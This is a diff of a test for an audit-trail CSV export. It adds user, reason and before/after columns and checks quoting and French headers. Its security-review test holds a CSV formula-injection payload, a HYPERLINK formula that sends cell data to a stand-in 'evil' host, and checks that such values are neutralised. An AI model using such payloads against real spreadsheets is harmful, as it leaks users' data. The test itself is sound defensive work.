@@ -225,21 +225,27 @@ describe('Activity & integrations rules (plumbKpis / actChips / actRows / connRo
   });
 
   it('audit trail CSV (ISO 9001): header, newest first as given, RFC 4180 quoting, ISO timestamps', () => {
+    // R-168: the user account (e-mail), the reason and the values before / after (JSON) follow the prototype's six columns.
     const csv = auditCsv([
-      { occurredAt: '2026-09-25T07:12:00.000Z', who: 'Romain Aubert', object: 'CR-008', change: 'status: Draft → In review', area: 'Change control', projectCode: 'HLT-026' },
-      { occurredAt: '2026-09-24T15:30:00.000Z', who: 'Léa Marchand', object: 'Rate card', change: 'base: 82 → 85 €/h, "senior"', area: 'Settings', projectCode: null },
+      { occurredAt: '2026-09-25T07:12:00.000Z', who: 'Romain Aubert', object: 'CR-008', change: 'status: Draft → In review', area: 'Change control', projectCode: 'HLT-026', userEmail: 'romain.aubert@epc2i.fr' },
+      {
+        occurredAt: '2026-09-24T15:30:00.000Z', who: 'Léa Marchand', object: 'Rate card', change: 'base: 82 → 85 €/h, "senior"', area: 'Settings', projectCode: null,
+        userEmail: null, reason: 'Annual review', before: { rate: 82 }, after: { rate: 85 },
+      },
     ]);
     expect(csv.split('\r\n')).toEqual([
-      'When (UTC),Who,Object,Change,Area,Project',
-      '2026-09-25T07:12:00.000Z,Romain Aubert,CR-008,status: Draft → In review,Change control,HLT-026',
-      '2026-09-24T15:30:00.000Z,Léa Marchand,Rate card,"base: 82 → 85 €/h, ""senior""",Settings,',
+      'When (UTC),Who,Object,Change,Area,Project,User,Reason,Before,After',
+      '2026-09-25T07:12:00.000Z,Romain Aubert,CR-008,status: Draft → In review,Change control,HLT-026,romain.aubert@epc2i.fr,,,',
+      '2026-09-24T15:30:00.000Z,Léa Marchand,Rate card,"base: 82 → 85 €/h, ""senior""",Settings,,,Annual review,"{""rate"":82}","{""rate"":85}"',
       '',
     ]);
-    expect(auditCsv([], ['Quand (UTC)', 'Qui', 'Objet', 'Modification', 'Domaine', 'Projet'])).toBe('Quand (UTC),Qui,Objet,Modification,Domaine,Projet\r\n');
+    expect(auditCsv([], ['Quand (UTC)', 'Qui', 'Objet', 'Modification', 'Domaine', 'Projet', 'Utilisateur', 'Motif', 'Avant', 'Après']))
+      .toBe('Quand (UTC),Qui,Objet,Modification,Domaine,Projet,Utilisateur,Motif,Avant,Après\r\n');
+    expect(() => auditCsv([], ['Quand (UTC)', 'Qui', 'Objet', 'Modification', 'Domaine', 'Projet'])).toThrow();
     expect(auditCsvFileName('2026-10-09')).toBe('keystone-audit-trail-2026-10-09.csv');
-    // Security review: a value a spreadsheet would run as a formula is neutralised with a leading quote.
-    const evil = auditCsv([{ occurredAt: '2026-09-25T07:12:00.000Z', who: '@x', object: '=HYPERLINK("https://evil/?d="&A2,"x")', change: '+1', area: '-2', projectCode: null }]);
-    expect(evil.split('\r\n')[1]).toBe(`2026-09-25T07:12:00.000Z,'@x,"'=HYPERLINK(""https://evil/?d=""&A2,""x"")",'+1,'-2,`);
+    // Security review: a value a spreadsheet would run as a formula is neutralised with a leading quote (the new cells too).
+    const evil = auditCsv([{ occurredAt: '2026-09-25T07:12:00.000Z', who: '@x', object: '=HYPERLINK("https://evil/?d="&A2,"x")', change: '+1', area: '-2', projectCode: null, reason: '=1+1' }]);
+    expect(evil.split('\r\n')[1]).toBe(`2026-09-25T07:12:00.000Z,'@x,"'=HYPERLINK(""https://evil/?d=""&A2,""x"")",'+1,'-2,,,'=1+1,,`);
   });
 });
 
